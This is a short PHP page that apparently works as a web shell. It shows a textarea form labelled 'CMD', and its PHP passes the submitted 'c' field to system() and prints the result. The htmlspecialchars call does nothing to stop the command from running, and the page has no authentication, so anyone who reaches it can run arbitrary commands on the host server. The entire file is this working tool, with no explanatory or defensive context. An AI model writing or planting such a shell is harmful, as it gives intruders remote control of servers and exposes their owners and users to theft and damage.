<style>
#id1 {
	width:		100%;
	resize:		none;
	background-color:	lightyellow;
}
</style>
<?php
function f1() {
	$cmd = htmlspecialchars($_POST["c"]);
	return system($cmd);
}
?>
<form action="main.php" method="post" enctype="multipart/form-data">
<textarea id="id1" name="c"></textarea>
<input type="submit" class="button" value='CMD' />
</form>
<pre><?php f1(); ?></pre>
